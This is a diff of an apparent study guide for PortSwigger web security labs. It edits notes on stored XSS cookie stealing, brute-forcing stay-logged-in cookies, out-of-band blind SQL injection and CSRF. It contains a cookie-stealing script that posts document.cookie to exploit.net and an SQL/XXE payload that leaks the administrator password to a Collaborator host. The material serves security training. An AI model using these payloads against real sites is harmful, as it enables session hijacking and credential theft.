@@ -317,6 +317,8 @@ document.write('<img src="http://exploit.net?cookieStealer='+document.cookie+'" 
 </script>
 ```  
 
+>Below target has a stored XSS vulnerability in the blog comments function. Exfiltrate a victim user that views comments after they are posted by stealing the victim's session cookie, and then use this cookie to impersonate the victim.  
+
 ![Stored XSS Blog post](images/stored-xss-blog-post.png)  
 
 >**Fetch API** JavaScript Cookie Stealer payload in Blog post comment.  
@@ -696,19 +698,21 @@ csrf=TOKEN&username=administrator
 
 ## Brute Force Authentication  
 
->Cookie value contain the password of the user logged in and is vulnerable to brute-forcing.  
+>Login option with a stay-logged-in checkbox result in Cookie value containing the password of the user logged in and is vulnerable to brute-forcing.  
 
-![brute](images/brute.png)  
+![stay-logged-in](images/stay-logged-in.png)  
 
->Intruder Payload processing, add grep option and the rules in sequenctial order before attack is submitted.  
+>Intruder Payload processing, add grep option and the following rules in sequenctial order before attack is submitted.  
+  
 1. Hash: MD5  
-2. Add prefix: wiener:  
+2. Add prefix: carlos:  
 3. Encode: Base64-encode.  
-
-
+  
 ```bash
 grep 'Update email'
 ```  
+
+![brute](images/brute.png)  
 
 [PortSwigger Lab: Brute-forcing a stay-logged-in cookie](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)  
   
@@ -719,17 +723,22 @@ grep 'Update email'
 
 >Error based or Blind SQL injection vulnerabilities, allow SQL queries in an application to be used to extract data or login credentials from the  database. SQLMAP is used to fast track the exploit and retrieve the sensitive information.  
 
->Adding a double (") or single quote (') to web parameters and evaluate the SQL error message, identify SQL injection vulnerability.  
+>To identify SQLi, by adding a double (") or single quote (') to web parameters or tracking cookies can break the SQL syntax resulting in error message, and postive SQL injection identification.  
 
 [SQL Injection cheat sheet examples](https://portswigger.net/web-security/sql-injection/cheat-sheet)  
 
 ![Identify the input parameter vulnerable to SQL injection](images/identify-sqli-parameter.png)  
 
->Out of band data exfiltration Blind SQL query, namely a tracking cookie.  
+### Blind SQLi  
+
+>Target is vulnerable to Out of band data exfiltration using Blind SQL exploitation query. In this case the trackingID cookie.  Below is combined SQL injection with basic XXE payloads.  
 
 ```sql
-TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+TrackingId=cookievaluex'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
 ```  
+
+![Blind SQL injection with out-of-band data exfil](images/blind-SQL-injection-out-of-band-exfil.png)  
+
 
 [PortSwigger Lab: Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)  
 
@@ -1309,7 +1318,7 @@ hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
 
 ## CSRF  
 
->Cross-Site Request Forgery vulnerability allows an attacker to force users to perform actions that they do not intend to perform.  
+>Cross-Site Request Forgery vulnerability allows an attacker to force users to perform actions that they did not intend to perform.  
   
 >oAuth linking exploit server hosting iframe, then deliver to victim, forcing user to update code linked.  
 
